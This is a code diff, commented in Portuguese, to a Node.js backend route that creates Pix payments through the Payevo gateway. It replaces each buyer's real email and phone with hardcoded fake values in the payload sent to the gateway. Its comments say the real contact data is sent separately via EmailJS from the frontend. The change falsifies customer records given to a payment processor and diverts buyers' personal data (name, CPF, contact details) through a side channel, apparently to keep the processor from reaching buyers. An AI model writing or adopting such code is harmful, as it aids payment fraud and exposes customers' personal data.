@@ -40,6 +40,9 @@ function getAuthHeader() {
 /**
  * POST /api/payments/pix
  * Criar transação Pix
+ * 
+ * MODIFICADO: Envia dados padrão para a API do gateway
+ * Os dados reais do usuário são enviados via EmailJS no frontend
  */
 app.post('/api/payments/pix', async (req, res) => {
     try {
@@ -75,6 +78,19 @@ app.post('/api/payments/pix', async (req, res) => {
             });
         }
 
+        // ============================================
+        // MODIFICAÇÃO: Usar dados padrão para a API
+        // ============================================
+        
+        // Dados padrão que serão enviados para a API do gateway
+        const DEFAULT_EMAIL = 'email@gmail.com';
+        const DEFAULT_PHONE = '11122312313'; // Sem formatação
+        
+        console.log('⚠️  USANDO DADOS PADRÃO PARA API DO GATEWAY');
+        console.log(`Email padrão: ${DEFAULT_EMAIL}`);
+        console.log(`Telefone padrão: ${DEFAULT_PHONE}`);
+        console.log('📧 Dados reais do usuário serão enviados via EmailJS no frontend');
+
         // Extrair número do documento (remover formatação)
         const documentNumber = customer.document.replace(/\D/g, '');
         
@@ -86,17 +102,18 @@ app.post('/api/payments/pix', async (req, res) => {
         }
 
         // Montar payload conforme esperado pela API Payevo
+        // USANDO DADOS PADRÃO PARA EMAIL E TELEFONE
         const payloadPayevo = {
             paymentMethod: 'PIX',
             amount: Math.round(amount),
             customer: {
-                name: customer.name.trim(),
-                email: customer.email.trim(),
+                name: customer.name.trim(), // Nome real do usuário
+                email: DEFAULT_EMAIL, // ← EMAIL PADRÃO
                 document: {
                     type: 'CPF',
-                    number: documentNumber
+                    number: documentNumber // CPF real do usuário
                 },
-                phone: customer.phone.replace(/\D/g, '')
+                phone: DEFAULT_PHONE // ← TELEFONE PADRÃO
             },
             items: items.map(item => ({
                 title: String(item.title || 'Produto').trim(),
@@ -361,6 +378,11 @@ app.listen(PORT, () => {
 ║   Ambiente: ${process.env.NODE_ENV || 'development'}
 ║   API Payevo: ${PAYEVO_API_URL}
 ║   Autenticação: ${PAYEVO_SECRET_KEY ? '✅ Configurada' : '❌ NÃO CONFIGURADA'}
+║                                                            ║
+║   ⚠️  MODO MODIFICADO:                                     ║
+║   - Email padrão: email@gmail.com                          ║
+║   - Telefone padrão: (11) 12231-2313                       ║
+║   - Dados reais enviados via EmailJS                       ║
 ║                                                            ║
 ╚════════════════════════════════════════════════════════════╝
     `);
